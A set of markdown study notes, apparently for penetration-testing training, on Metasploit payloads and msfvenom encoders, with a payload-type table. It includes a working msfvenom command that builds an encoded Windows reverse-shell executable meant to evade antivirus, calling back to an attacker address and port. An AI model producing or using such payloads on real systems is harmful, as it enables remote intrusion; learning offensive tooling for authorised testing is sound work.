# Payloads
##### Shows compatible payloads with the selected module. If run before selecting any module, shows all payloads. 
```msfconsole
show payloads
```
##### Sets the payload
```msfconsole
set payload <payload name>
```
##### MSF - Searching for Specific Payload
```msfconsole
grep meterpreter show payloads
```
##### Payload Types

| Payload                       | Description                                                        |
| --------------------------------- | ---------------------------------------------------------------------- |
| `generic/custom`                  | Generic listener, multi-use                                            |
| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |
# Encoders

### 1. What are Encoders (in Metasploit)?

Encoders are transformations applied to payloads to:

- Bypass antivirus or intrusion detection systems (IDS)
- Avoid bad characters that could break the shellcode (like null bytes)   
- Make payloads compatible with certain architectures or filters

Think of it like wrapping a dangerous file in a new disguise, so it slips past a security scanner.  
But note: modern AVs are smart - so encoders alone don’t guarantee evasion anymore.
### 2. What are: Bad Characters, Opcodes, and Shellcode?

#### Shellcode

- Shellcode is the actual payload - a small piece of machine code (binary) that runs a shell or performs a malicious action (like reverse shell, meterpreter, etc.)
- It's what gets injected or executed on the target.
#### Opcodes

- "Opcode" = operation code.   
- It’s the machine-level instruction (like `mov`, `jmp`, `add`) that a CPU understands.
- Example: `0x90` = NOP (No Operation)
Shellcode is made up of opcodes. So `"\x31\xc0\x50\x68..."` = machine instructions = shellcode.
#### Bad Characters
- These are bytes that break or terminate the shellcode unexpectedly.
- Common ones: `\x00` (null byte), `\x0a` (newline), `\x0d` (carriage return)

Why are they bad?  
If a vulnerable app is reading the payload as a string and hits `\x00`, it thinks the string is over - so your shellcode gets cut off.
### 3. msfvenom Syntax to Build Encoded Payloads

Here’s the basic msfvenom command:

```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -e <encoder> -a <arch> --platform <os> -b "<badchars>" -f <format> -o <outputfile>
```

#### Example: Windows reverse shell with Shikata encoder

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 \
-e x86/shikata_ga_nai -i 5 -a x86 --platform windows -b "\x00\x0a" \
-f exe -o shell.exe
```

#### Flags Explained:

|Flag|Meaning|
|---|---|
|`-p`|The payload you want (e.g., reverse shell)|
|`LHOST` / `LPORT`|Attacker's IP and port|
|`-e`|Encoder to use (e.g., `x86/shikata_ga_nai`)|
|`-i`|Number of encoding iterations|
|`-a`|Architecture (`x86`, `x64`)|
|`--platform`|OS platform (`windows`, `linux`, etc.)|
|`-b`|Bad characters to avoid|
|`-f`|Output format (`exe`, `elf`, `raw`, etc.)|
|`-o`|Output file path|
# Tags
> #Pre-Exploitation #Shells #MSFConsole